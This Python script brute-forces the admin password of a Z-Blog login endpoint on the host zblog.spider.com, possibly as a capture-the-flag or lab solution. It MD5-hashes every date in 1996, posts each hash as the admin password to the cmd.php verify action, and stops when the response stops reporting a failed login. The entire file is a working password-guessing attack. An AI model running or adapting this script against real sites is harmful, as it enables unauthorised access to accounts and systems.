import requests
import hashlib
header = {"Content-Type": "application/x-www-form-urlencoded"}
url = "http://zblog.spider.com/zb_system/cmd.php?act=verify"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
data = "btnPost=%E7%99%BB%E5%BD%95&username=admin&password={}&savedate=1"
year = 1996
for month in range(1, 13):
    for day in range(1, 32):
        key = year * 10000 + month * 100 + day
        hash = hashlib.md5(str(key).encode()).hexdigest()
        tmp = data.format(hash)
        r = requests.post(url, data=tmp, headers=header)
        # print("Trying data: {}".format(tmp))
        # s = r.text.find("\u767b\u5f55\u5931\u8d25") 
        if r.text.find("\u767b\u5f55\u5931\u8d25") < 0:
            print("\nSucceed ! key is {}".format(key))
            exit()

        # if (r.status_code != 500):
        #     print("\nSucceed ! key is {}".format(key))
        #     exit(0)
        # exit()